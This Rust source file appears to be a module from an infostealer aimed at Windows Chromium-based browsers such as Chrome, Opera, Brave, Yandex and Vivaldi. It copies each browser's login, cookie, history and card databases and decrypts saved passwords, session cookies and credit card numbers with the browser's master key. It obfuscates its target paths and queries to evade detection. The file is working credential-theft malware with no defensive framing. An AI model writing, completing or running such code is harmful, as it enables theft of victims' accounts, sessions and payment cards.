use crate::crypto;

use rusqlite::{Connection, OpenFlags};
use std::{
    env,
    fs::{self},
    path::{Path, PathBuf},
};
use uuid::Uuid;

fn get_chromunium_targets() -> Vec<String> {
    let mut targets = Vec::new();
    targets.push(obfstr::obfstr!("Roaming\\Opera Software\\Opera Stable").to_string());
    targets.push(obfstr::obfstr!("Local\\Google\\Chrome").to_string());
    targets.push(obfstr::obfstr!("Local\\Google(x86)\\Chrome").to_string());
    targets.push(obfstr::obfstr!("Local\\BraveSoftware\\Brave-Browser").to_string());
    targets.push(obfstr::obfstr!("Local\\Yandex\\YandexBrowser").to_string());
    targets.push(obfstr::obfstr!("Local\\Chromunium").to_string());
    targets.push(obfstr::obfstr!("Local\\Epic Privacy Browser").to_string());
    targets.push(obfstr::obfstr!("Local\\Amigo").to_string());
    targets.push(obfstr::obfstr!("Local\\Vivaldi").to_string());
    targets.push(obfstr::obfstr!("Local\\Orbitum").to_string());
    targets.push(obfstr::obfstr!("Local\\Mail.Ru\\Atom").to_string());
    targets.push(obfstr::obfstr!("Local\\Kometa").to_string());
    targets.push(obfstr::obfstr!("Local\\Comodo\\Dragon").to_string());
    targets.push(obfstr::obfstr!("Local\\Torch").to_string());
    targets.push(obfstr::obfstr!("Local\\Comodo").to_string());
    targets.push(obfstr::obfstr!("Local\\Slimjet").to_string());
    targets.push(obfstr::obfstr!("Local\\360Browser\\Browser").to_string());
    targets.push(obfstr::obfstr!("Local\\Maxthon3").to_string());
    targets.push(obfstr::obfstr!("Local\\K-Melon").to_string());
    targets.push(obfstr::obfstr!("Local\\Sputnik\\Sputnik").to_string());
    targets.push(obfstr::obfstr!("Local\\Nichrome").to_string());
    targets.push(obfstr::obfstr!("Local\\CocCoc\\Browser").to_string());
    targets.push(obfstr::obfstr!("Local\\uCozMedia\\Uran").to_string());
    targets.push(obfstr::obfstr!("Local\\Chromodo").to_string());
    targets.push(obfstr::obfstr!("Local\\Yandex\\YandexBrowser").to_string());

    targets
}

fn get_user_data_dir(chromunium_dir: &PathBuf) -> PathBuf {
    let mut user_data_dir = chromunium_dir.to_owned();

    if !chromunium_dir.to_string_lossy().contains("Opera Software") {
        user_data_dir = user_data_dir.join("User Data");
    }

    user_data_dir
}

fn get_default_path(user_data_dir: &PathBuf) -> PathBuf {
    let mut login_data_path = user_data_dir.to_owned();

    if !user_data_dir.to_string_lossy().contains("Opera Software") {
        login_data_path = login_data_path.join("Default");
    }

    login_data_path
}

pub fn get_passwords() -> Vec<String> {
    let mut passwords = Vec::new();

    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    let temp_env = std::env::temp_dir();

    for chromunium_target in get_chromunium_targets() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let local_state_path = user_data_dir.join("Local State");

        if !local_state_path.exists() {
            continue;
        }

        let master_key = match crypto::get_master_key(&local_state_path) {
            Some(master_key) => master_key,
            None => continue,
        };

        let default_path = get_default_path(&user_data_dir);
        let login_data_path = default_path.join("Login Data");

        if !login_data_path.exists() {
            continue;
        }

        let temp_path = temp_env.join(Uuid::new_v4().to_string());
        fs::copy(login_data_path, &temp_path).unwrap();

        let conn =
            Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

        let mut stmt = conn
            .prepare(obfstr::obfstr!(
                "SELECT origin_url, username_value, password_value FROM logins"
            ))
            .unwrap();

        let mut rows = stmt.query([]).unwrap();

        while let Some(row) = rows.next().unwrap() {
            let origin_url: String = row.get(0).unwrap();
            let username: String = row.get(1).unwrap();
            let password_value = row.get(2).unwrap();

            let password = crypto::aes_decrypt(password_value, &master_key);

            passwords.push(format!(
                "URL: {}\nUsername: {}\nPassword: {}\n\n",
                origin_url,
                username,
                std::str::from_utf8(&password).unwrap()
            ));
        }

        drop(rows);
        stmt.finalize().unwrap();
        conn.close().unwrap();
        fs::remove_file(temp_path).unwrap();
    }

    passwords
}

pub fn get_cookies() -> Vec<String> {
    let mut cookies = Vec::new();

    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    let temp_env = std::env::temp_dir();

    for chromunium_target in get_chromunium_targets() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let local_state_path = user_data_dir.join("Local State");

        if !local_state_path.exists() {
            continue;
        }

        let master_key = match crypto::get_master_key(&local_state_path) {
            Some(master_key) => master_key,
            None => continue,
        };

        let default_path = get_default_path(&user_data_dir);
        let cookies_path = default_path.join("Network").join("Cookies");

        if !cookies_path.exists() {
            continue;
        }

        let temp_path = temp_env.join(Uuid::new_v4().to_string());
        fs::copy(cookies_path, &temp_path).unwrap();

        let conn =
            Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

        let mut stmt = conn
            .prepare(obfstr::obfstr!(
                "SELECT host_key, name, encrypted_value FROM cookies"
            ))
            .unwrap();

        let mut rows = stmt.query([]).unwrap();

        while let Some(row) = rows.next().unwrap() {
            let host: String = row.get(0).unwrap();
            let name: String = row.get(1).unwrap();
            let encrypted_value = row.get(2).unwrap();

            let value = crypto::aes_decrypt(encrypted_value, &master_key);

            cookies.push(format!(
                "Host: {}\nName: {}\nValue: {}\n\n",
                host,
                name,
                std::str::from_utf8(&value).unwrap()
            ));
        }

        drop(rows);
        stmt.finalize().unwrap();
        conn.close().unwrap();
        fs::remove_file(temp_path).unwrap();
    }

    cookies
}

pub fn get_history() -> Vec<String> {
    let mut history = Vec::new();

    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    let temp_env = std::env::temp_dir();

    for chromunium_target in get_chromunium_targets() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let default_path = get_default_path(&user_data_dir);
        let history_path = default_path.join("History");

        if !history_path.exists() {
            continue;
        }

        let temp_path = temp_env.join(Uuid::new_v4().to_string());
        fs::copy(history_path, &temp_path).unwrap();

        let conn =
            Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

        let mut stmt = conn
            .prepare(obfstr::obfstr!("SELECT title, url, visit_count FROM urls"))
            .unwrap();
        let mut rows = stmt.query([]).unwrap();

        while let Some(row) = rows.next().unwrap() {
            let title: String = row.get(0).unwrap();
            let url: String = row.get(1).unwrap();
            let visit_count: u32 = row.get(2).unwrap();

            history.push(format!(
                "URL: {}\nTitle: {}\nVisit count: {}\n\n",
                url, title, visit_count
            ));
        }

        drop(rows);
        stmt.finalize().unwrap();
        conn.close().unwrap();
        fs::remove_file(temp_path).unwrap();
    }

    history
}

pub fn get_credit_cards() -> Vec<String> {
    let mut credit_cards = Vec::new();

    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    for chromunium_target in get_chromunium_targets() {
        let chromunium_dir = appdata_dir.join(chromunium_target);

        if !chromunium_dir.exists() {
            continue;
        }

        let user_data_dir = get_user_data_dir(&chromunium_dir);
        let local_state_path = user_data_dir.join("Local State");

        if !local_state_path.exists() {
            continue;
        }

        let master_key = match crypto::get_master_key(&local_state_path) {
            Some(master_key) => master_key,
            None => continue,
        };

        let default_path = get_default_path(&user_data_dir);
        let credit_cards_path = default_path.join("Web Data");

        if !credit_cards_path.exists() {
            continue;
        }

        let temp_env = std::env::temp_dir();

        let temp_path = temp_env.join(Uuid::new_v4().to_string());
        fs::copy(credit_cards_path, &temp_path).unwrap();

        let conn =
            Connection::open_with_flags(&temp_path, OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();

        let mut stmt = conn.prepare(obfstr::obfstr!("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")).unwrap();

        let mut rows = stmt.query([]).unwrap();

        while let Some(row) = rows.next().unwrap() {
            let name_on_card: String = row.get(0).unwrap();
            let expiration_month: i32 = row.get(1).unwrap();
            let expiration_year: i32 = row.get(2).unwrap();
            let card_number_encrypted = row.get(3).unwrap();

            let card_number = crypto::aes_decrypt(card_number_encrypted, &master_key);

            let expiration = format!("{}/{}", expiration_month, expiration_year);

            credit_cards.push(format!(
                "Name: {}\nExpiration: {}\nCard number: {}\n\n",
                name_on_card,
                expiration,
                std::str::from_utf8(&card_number).unwrap()
            ));
        }

        drop(rows);
        stmt.finalize().unwrap();
        conn.close().unwrap();
        fs::remove_file(temp_path).unwrap();
    }

    credit_cards
}
